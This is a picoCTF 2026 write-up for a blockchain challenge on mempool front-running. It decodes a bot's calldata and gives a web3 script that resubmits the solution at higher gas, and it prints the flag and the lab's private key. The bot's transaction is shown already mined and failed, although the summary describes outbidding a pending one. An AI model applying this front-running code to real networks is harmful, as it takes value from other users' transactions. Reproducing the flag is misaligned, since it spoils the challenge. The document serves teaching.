# Front Running — picoCTF 2026

**Category:** Blockchain
**Flag:** `picoCTF{m3mp00l_h31st_c1ef1eab}`
**Ethereum Node:** `http://candy-mountain.picoctf.net:57313`

---

## Background: What is Front-Running?

In Ethereum, transactions don't execute instantly. They first enter the **mempool** — a public waiting room of unconfirmed transactions. Because the mempool is public, anyone can read a pending transaction's calldata before it is mined.

**Front-running** is the attack of:
1. Seeing a valuable pending transaction in the mempool
2. Extracting the useful information from its calldata
3. Submitting your own transaction with the same parameters but a **higher gas price**
4. Your transaction gets mined first — stealing the outcome

---

## The Contract

```solidity
pragma solidity ^0.8.0;

contract MempoolChallenge {
    bytes32 public constant targetHash =
        0xd781033f8619ec5d3ab5387d3ad9b87203acce775bc100b32bfbac009e596cd6;

    function solve(string memory solution) public {
        require(!revealed, "Challenge already solved!");
        require(
            keccak256(abi.encodePacked(solution)) == targetHash,
            "Incorrect solution!"
        );
        require(msg.sender == studentAddress, "Only the student can claim the flag!");

        revealed = true;
        emit FlagRevealed(flag);
    }
}
```

### Key observations

- `solve()` requires the correct pre-image to `targetHash`
- **Only `studentAddress` (us) can call it** — the victim bot knows the answer but can't claim the flag
- The flag is emitted via `FlagRevealed` event when `solve()` succeeds

---

## Reconnaissance

### Step 1 — Retrieve credentials

The web UI at `http://candy-mountain.picoctf.net:58923/` provides:
- Contract: `0x5FbDB2315678afecb367f032d93F642f64180aa3`
- Player address: `0x6d858a45251E8AbFFe604281B70B1a3f3be48D19`
- Player private key: `0x488d7e5694c6f11c6ec4d6f5733424faf2c219a1586cf213f3d306a55d376109`

### Step 2 — Find the victim bot's transaction

Scanning early blocks for `solve()` calls (function selector `0x76fe1e92`):

Block 2 contains a failed transaction from the victim bot:
```json
{
  "from": "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
  "input": "0x76fe1e92...7069636f4354467b6d336d7030306c5f7031723474337d...",
  "gasPrice": "1000000000"
}
```

The transaction failed (status `0x0`) because the bot is not the `studentAddress`.

### Step 3 — Decode the calldata

ABI-encoded `solve(string)` layout:
```
0x76fe1e92        ← function selector
0000...0020       ← offset to string data
0000...0017       ← string length = 23 bytes
7069636f4354467b6d336d7030306c5f   ← "picoCTF{m3mp00l_p"
7031723474337d                     ← "1r4t3}"
```

```python
bytes.fromhex("7069636f4354467b6d336d7030306c5f7031723474337d").decode()
# → 'picoCTF{m3mp00l_p1r4t3}'
```

This is the **pre-image** (the solution), not the flag. Verifying:

```python
from web3 import Web3
Web3.keccak(text="picoCTF{m3mp00l_p1r4t3}").hex()
# d781033f8619ec5d3ab5387d3ad9b87203acce775bc100b32bfbac009e596cd6  ✓
```

---

## The Attack

We have the solution and are the `studentAddress`. We submit with **10× the bot's gas price** to guarantee priority:

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://candy-mountain.picoctf.net:57313"))

CONTRACT  = "0x5FbDB2315678afecb367f032d93F642f64180aa3"
PRIVKEY   = "0x488d7e5694c6f11c6ec4d6f5733424faf2c219a1586cf213f3d306a55d376109"
MY_ADDR   = "0x6d858a45251E8AbFFe604281B70B1a3f3be48D19"
SOLUTION  = "picoCTF{m3mp00l_p1r4t3}"

abi = [{"name": "solve", "type": "function",
        "inputs": [{"name": "solution", "type": "string"}], "outputs": []}]
contract = w3.eth.contract(address=CONTRACT, abi=abi)

high_gas = w3.eth.gas_price * 10   # outbid the victim bot

tx = contract.functions.solve(SOLUTION).build_transaction({
    "from":     MY_ADDR,
    "nonce":    w3.eth.get_transaction_count(MY_ADDR),
    "gasPrice": high_gas,
    "gas":      100000,
    "chainId":  w3.eth.chain_id,
})

signed  = w3.eth.account.sign_transaction(tx, PRIVKEY)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

# Decode FlagRevealed event data
flag_hex = receipt["logs"][0]["data"]
# → picoCTF{m3mp00l_h31st_c1ef1eab}
```

### Why the solution ≠ the flag

`picoCTF{m3mp00l_p1r4t3}` is the *password* passed to `keccak256`. The actual flag (`picoCTF{m3mp00l_h31st_c1ef1eab}`) is a separate secret stored in the contract at deploy time and only revealed via the `FlagRevealed` event when `solve()` succeeds.

---

## Summary

```
Victim bot                          Mempool                        Miner
─────────────────────────────────────────────────────────────────────────
submit solve("picoCTF{m3mp00l_p1r4t3}")
  gasPrice = 1 gwei           →  [pending tx visible to all]
                                        ↑
                              We read calldata, decode solution
                              submit solve("picoCTF{m3mp00l_p1r4t3}")
                                gasPrice = 10 gwei          →  mined first ✓
                                                                FlagRevealed emitted
                                                                → picoCTF{m3mp00l_h31st_c1ef1eab}
```

**Key takeaway:** Never submit a secret on-chain — even in a pending transaction — because the mempool is fully public. Anyone watching can extract your calldata and resubmit it with a higher gas price before your transaction is confirmed.
